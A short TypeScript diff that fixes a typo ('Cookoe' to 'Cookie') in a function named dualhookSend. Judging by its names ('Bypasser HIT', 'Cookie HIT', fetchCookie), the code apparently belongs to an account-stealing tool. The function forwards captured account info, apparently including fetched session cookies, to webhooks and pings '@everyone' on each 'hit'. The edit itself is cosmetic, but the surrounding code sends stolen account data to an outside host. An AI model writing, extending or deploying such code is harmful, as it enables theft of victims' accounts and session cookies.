@@ -302,7 +302,7 @@ export async function broadcastLiveBypassFailed(d: AccountInfo, reason?: string)
 // Send a hit (bypass or fetch) to the main webhook for that kind
 export async function dualhookSend(kind: 'bypass' | 'fetch', d: AccountInfo) {
   const mainKey = kind === 'bypass' ? WK.bypass : WK.fetchCookie;
-  const tag = kind === 'bypass' ? 'Bypasser HIT | @everyone' : 'Cookoe HIT | @everyone';
+  const tag = kind === 'bypass' ? 'Bypasser HIT | @everyone' : 'Cookie HIT | @everyone';
   await sendHitEmbed(getWebhook(mainKey), d, { tag });
 }
 
